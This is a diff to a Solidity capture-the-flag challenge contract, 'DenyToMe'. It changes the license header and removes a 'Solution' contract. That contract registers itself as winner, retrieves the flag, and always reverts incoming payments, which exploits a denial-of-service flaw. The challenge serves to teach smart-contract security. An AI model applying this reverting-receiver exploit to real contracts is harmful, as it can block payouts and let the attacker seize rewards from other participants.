@@ -1,4 +1,6 @@
-// SPDX-License-Identifier: UNLICENSED
+// SPDX-FileCopyrightText: © 2023 Telefónica Digital España S.L.
+
+// SPDX-License-Identifier: AGPL-3.0-or-later
 pragma solidity ^0.8.9;
 
 // Contract that works when you deny service to it
@@ -62,41 +64,7 @@ contract DenyToMe {
 	}
 }
 
-contract Solution {
-	string public flag;
-	address public owner;
-	DenyToMe public denyToMe;
 
-	modifier onlyOwner() {
-		require(msg.sender == owner, "You are not the owner");
-		_;
-	}
-
-	constructor(DenyToMe _denyToMe) {
-		owner = msg.sender;
-		denyToMe = _denyToMe;
-	}
-
- 	function executeSolution() public payable onlyOwner {
-        uint position = 1;
-        require(denyToMe.minimunFee() == msg.value, "You must pay the minimun fee");
-        denyToMe.makeMeWinner{value: msg.value}(position, address(this));
-    }
-
-    function getFlag() public payable onlyOwner returns (string memory) {
-        require(denyToMe.minimunFee() * 5 == msg.value, "You must pay the minimun fee");
-        flag = denyToMe.getFlag{value: msg.value}();
-        return flag;
-    }
-
-    fallback() external payable {
-        require(false, "Fallback function is not allowed");
-    }
-
-    receive() external payable {
-        require(false, "Fallback function is not allowed");
-    }
-}
 
 
  
